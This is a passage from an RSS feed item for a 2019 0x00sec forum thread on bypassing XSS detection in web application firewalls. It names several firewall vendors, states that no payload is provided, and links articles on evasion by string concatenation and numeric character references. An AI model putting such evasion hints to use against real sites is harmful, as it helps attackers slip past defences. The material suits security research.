<pre>Name: <a href="https://modsecurity.org/" rel="noopener nofollow ugc">ModSecurity</a>
Name: <a href="https://www.wordfence.com/" rel="noopener nofollow ugc">Wordfence</a>
Name: <a href="https://www.cloudflare.com/" rel="noopener nofollow ugc">Cloudflare</a>
Name: <a href="https://www.akamai.com/" rel="noopener nofollow ugc">Akamai</a>
Name: Comodo
Name: F5
<p>There are many other firewall providers that I cannot provide publicly.<br>
Sorry I cannot provide payload POC.<br>
Original post: <a href="https://medium.com/@th3law/fun-bypass-xss-detection-waf-cabd431e030e" rel="noopener nofollow ugc">https://medium.com/@th3law/fun-bypass-xss-detection-waf-cabd431e030e</a></p>
</pre>
https://medium.com/secjuice/waf-evasion-techniques-718026d693d8
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c7390150cd0078e967a18c7663581b9b334d239.png" class="site-icon" width="" height="">
      <a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="noopener nofollow ugc" title="04:44PM - 25 February 2018">Medium – 25 Feb 18</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8f66716f300b4dc3f3ba7022c82bcec1e6678099.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="noopener nofollow ugc">Web Application Firewall (WAF) Evasion Techniques #2</a></h3>

<p>String concatenation in a Remote Command Execution payload makes you able to bypass firewall rules (Sucuri, ModSecurity)</p>

  <p><span class="label1">Reading time: 9 min read</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox wikipedia">
  <header class="source">
      <a href="https://en.wikipedia.org/wiki/Numeric_character_reference" target="_blank" rel="noopener nofollow ugc">en.wikipedia.org</a>
  </header>
  <article class="onebox-body">
    

<h3><a href="https://en.wikipedia.org/wiki/Numeric_character_reference" target="_blank" rel="noopener nofollow ugc">Numeric character reference</a></h3>

<p>A numeric character reference (NCR) is a common markup construct used in SGML and SGML-derived markup languages such as HTML and XML. It consists of a short sequence of characters that, in turn,  represents a single character. Since WebSgml, XML and HTML 4, the code points of the Universal Character Set (UCS) of Unicode are used. NCRs are typically used in order to represent characters that are not directly encodable in a particular document (for example, because they are international characters...</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228/1</link>
        <pubDate>Tue, 12 Mar 2019 16:10:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12228-1</guid>
        <source url="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228.rss">[FUN] Bypass XSS Detection WAF</source>
      </item>
  </channel>
</rss>
